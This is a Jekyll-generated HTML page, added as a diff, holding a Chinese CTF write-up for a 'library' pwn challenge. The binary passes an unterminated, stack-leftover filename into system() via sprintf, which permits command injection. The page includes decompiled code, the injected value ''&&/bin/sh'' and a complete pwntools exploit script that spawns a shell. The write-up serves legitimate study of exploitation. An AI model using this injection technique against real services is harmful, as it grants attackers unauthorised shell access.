@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>2018-03-03-library</title>
+  <meta name="description" content="0x00 前言">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/jekyll/update/2019/01/02/library.html">
+  <link rel="alternate" type="application/rss+xml" title="Your awesome title" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Your awesome title</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">2018-03-03-library</h1>
+    <p class="post-meta"><time datetime="2019-01-02T21:01:05+08:00" itemprop="datePublished">Jan 2, 2019</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h1 id="0x00">0x00 前言</h1>
+
+<p>这种命令行注入在pwn中出现的比较少，所以记录分享一下。</p>
+
+<h1 id="0x01">0x01 命令行注入介绍</h1>
+
+<p>熟悉web安全的话就知道，如果对特殊字符过滤不当，会引发sql注入或者xss等安全漏洞。其中，命令行注入较为严重，因为可以直接拿到漏洞程序当前权限的OSshell。<br>
+然而，命令行注入不仅在web中会出现，在C语言程序中，也会出现命令行注入的漏洞。比方说这道pwn题，就是调用system时，没有对输入数据进行\0截断以及对特殊字符处理不当而导致的。<br>
+命令行注入相对于其他二进制漏洞相比利用比较简单，比方说这道题，举个例子：<br>
+<code class="prettyprint">c<br>
+sprintf(&amp;s, &quot;du -sh lib/&#39;%s&#39;&quot;, v6);<br>
+system(&amp;s);<br>
+</code><br>
+其中设计初衷，v6应当是一个合法的文件名。但是如果攻击者恶意操控v6，比方说，让v6为：&#39;&amp;&amp;/bin/sh&#39;<br>
+进行sprintf拼接后，system所执行的命令为：<br>
+<code class="prettyprint">bash<br>
+du -sh lib/&#39;&#39;&amp;&amp;/bin/sh&#39;&#39;<br>
+</code><br>
+这里有两个linux命令行的知识：<br>
+1. &amp;&amp;，这是拼接两个命令，如果我们执行 command1&amp;&amp;command2，那么等价于先执行command1在执行command2。其中命令跟&amp;&amp;之间不必加空格。<br>
+2. 在命令后不加空格的&#39;&#39;（两个单引号）会被忽略，比如ls&#39;&#39;等价于ls，/bin/sh&#39;&#39;等价于/bin/sh，du -sh lib/&#39;&#39;等价于du -sh lib/（即，实际传进去的参数是lib/不是lib/&#39;&#39;）</p>
+
+<p>所以，执行上面的命令，相当于先执行了<br>
+<code class="prettyprint">bash<br>
+du -sh lib/<br>
+</code><br>
+再执行<br>
+<code class="prettyprint">bash<br>
+/bin/sh<br>
+</code><br>
+所以，可以getshell。</p>
+
+<h1 id="0x02">0x02 题目</h1>
+
+<p>题目所给的是一个library的服务，可以上传book，查看books，清除books。其中，book存放在lib/文件夹中。</p>
+
+<h1 id="0x03">0x03 漏洞点</h1>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="o">*</span><span class="nf">list_books</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// eax
+</span>  <span class="kt">char</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span> <span class="c1">// eax
+</span>  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [esp+4h] [ebp-C14h]
+</span>  <span class="kt">char</span> <span class="n">ptr</span><span class="p">;</span> <span class="c1">// [esp+804h] [ebp-414h]
+</span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+C04h] [ebp-14h]
+</span>  <span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// [esp+C08h] [ebp-10h]
+</span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span> <span class="c1">// [esp+C0Ch] [ebp-Ch]
+</span>
+  <span class="n">v0</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="s">"ls lib/"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+  <span class="n">stream</span> <span class="o">=</span> <span class="n">v0</span><span class="p">;</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="mh">0x400u</span><span class="p">,</span> <span class="n">v0</span><span class="p">);</span>
+  <span class="n">v4</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">v6</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="n">delims</span><span class="p">);</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">send</span><span class="p">(</span><span class="s">"Book list:</span><span class="se">\n</span><span class="s">Size</span><span class="se">\t</span><span class="s">E-book</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">while</span> <span class="p">(</span> <span class="n">v6</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">sprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="s">"du -sh lib/'%s'"</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
+      <span class="c1">//很明显，这里存在可能的命令行注入
+</span>      <span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+      <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">delims</span><span class="p">);</span>
+      <span class="n">v6</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</code></pre></div>
+<p>其中list_books代码如上，v6来自fread从popen中的返回结果。他本来想做的是输出每个文件的大小，但是fread后没有用\0截断。所以调用strtok时，可能会读到fread后面的垃圾数据（当然如果可以操控的话就不是垃圾数据了）</p>
+
+<p>sprintf的栈溢出会比较难利用，因为&amp;s比较大，有0x800，而v6是从&amp;ptr里面strtok出来的，而&amp;ptr更小，只有0x400。所以应该没法很好的利用。</p>
+
+<h1 id="0x04">0x04 操控垃圾数据</h1>
+
+<p>那么，我们怎么去操控&amp;ptr中的垃圾数据呢？这个时候看看另外一个函数</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">upload_book</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// eax
+</span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// eax
+</span>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span> <span class="c1">// [esp+Ch] [ebp-42Ch]
+</span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span> <span class="c1">// [esp+40Ch] [ebp-2Ch]
+</span>  <span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// [esp+420h] [ebp-18h]
+</span>  <span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">;</span> <span class="c1">// [esp+424h] [ebp-14h]
+</span>  <span class="kt">size_t</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [esp+428h] [ebp-10h]
+</span>  <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [esp+42Ch] [ebp-Ch]
+</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">book_counter</span> <span class="o">&gt;</span> <span class="mi">10</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">send</span><span class="p">(</span><span class="s">"too many books</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">send</span><span class="p">(</span><span class="s">"Book filename: "</span><span class="p">);</span>
+  <span class="n">v8</span> <span class="o">=</span> <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%20s"</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">send</span><span class="p">(</span><span class="s">"Wrong title format</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">v7</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="n">v7</span> <span class="o">-</span> <span class="mi">3</span><span class="p">],</span> <span class="s">".bk"</span><span class="p">)</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">send</span><span class="p">(</span><span class="s">"The name needs to end with '.bk'</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">send</span><span class="p">(</span><span class="s">"e-book contents: </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x400u</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span> <span class="o">!=</span> <span class="err">'</span><span class="n">BBBB</span><span class="err">'</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">send</span><span class="p">(</span><span class="s">"Not an e-book</span><span class="se">\n</span><span class="s">aborting...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x18u</span><span class="p">);</span>
+  <span class="n">dest</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
+  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v1</span> <span class="o">=</span> <span class="mh">0x2F62696C</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">strcat</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+  <span class="n">stream</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="s">"w"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">stream</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">send</span><span class="p">(</span><span class="s">"Bad book filename</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">v2</span> <span class="o">=</span> <span class="n">book_counter</span><span class="o">++</span><span class="p">;</span>
+  <span class="n">books</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="o">=</span> <span class="n">dest</span><span class="p">;</span>
+  <span class="n">fwrite</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="mh">0x400u</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">fclose</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>其中，这在栈中也会分配0x400个字节，并且我们可以写入。<br>
+并且，调用完这个函数之后，清除栈空间时，只是简单地add esp,xxx，并不会清空其中数据。然后，再调用存在命令行注入的函数并分配栈空间时，也只是单纯地sub esp,xxx，也不会清空数据。在C语言中，如果此时对不赋值的局部变量直接访问的话，是UB行为。但是，从二进制安全的角度看的话，便是可利用的点了。其中这道题，本身就是一个局部字符串读取后未截断而造成的UB，然而我们便可以利用这个。</p>
+
+<p>那么来试试： <br>
+<img src="/images/742286_B8YD2W3Y8ZJNJ9K.png" alt="图片描述"></p>
+
+<p>很明显，BBBB123456789123456789123456789123456789AAAA的后面89123456789AAAA被拼接到du -sh lib/&#39;%s&#39;中了<br>
+动态调试看一下的话</p>
+
+<p>第一次在system停下<br>
+ <img src="/images/742286_KEV75FKDRYYKT77.png" alt="图片描述"></p>
+
+<p>第二次在system停下<br>
+ <img src="/images/742286_TTMMX45NMT3RYGD.png" alt="图片描述"></p>
+
+<p>所以很明显，只要把89123456789AAAA改成</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="s1">'&amp;&amp;/bin/sh'</span><span class="se">\x</span>00
+</code></pre></div>
+<p>就可以getshell了。如前面所说。<br>
+其中，\x00是我们自己手动截断，不然strtok还会继续往后读。</p>
+
+<p>所以最后exp</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#BBBB1234567891234567891234567'&amp;&amp;/bin/sh'</span>
+<span class="n">g_local</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">if</span> <span class="n">g_local</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">"./library"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"xxxx"</span><span class="p">,</span><span class="mi">1234</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">upload_book</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">filename</span> <span class="o">+=</span> <span class="s">".bk"</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Book filename: "</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">filename</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">filename</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"e-book contents: </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter command: "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">list_books_and_shell</span><span class="p">():</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="n">upload_book</span><span class="p">(</span><span class="s">"1"</span><span class="p">,</span> <span class="s">"BBBB1234567891234567891234567</span><span class="se">\'</span><span class="s">&amp;&amp;/bin/sh</span><span class="se">\'\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">list_books_and_shell</span><span class="p">()</span>
+</code></pre></div>
+<h1 id="0x05">0x05 后言</h1>
+
+<p>还有一点要注意，pwndbg好像会默认在fork时跟子进程，所以要在~/.gdbinit的最后面(加载pwndbg之后)加上set follow-fork-mode parent。并且，&amp;&amp;与命令之间不能加空格。因为他strtok是通过空格和换行分断字符串的，加了空格我们的payload就会被strtok分割开。</p>
+
+  </div>
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Your awesome title</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li>Your awesome title</li>
+          <li><a href="mailto:your-email@domain.com">your-email@domain.com</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/jekyll"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">jekyll</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/jekyllrb"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">jekyllrb</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
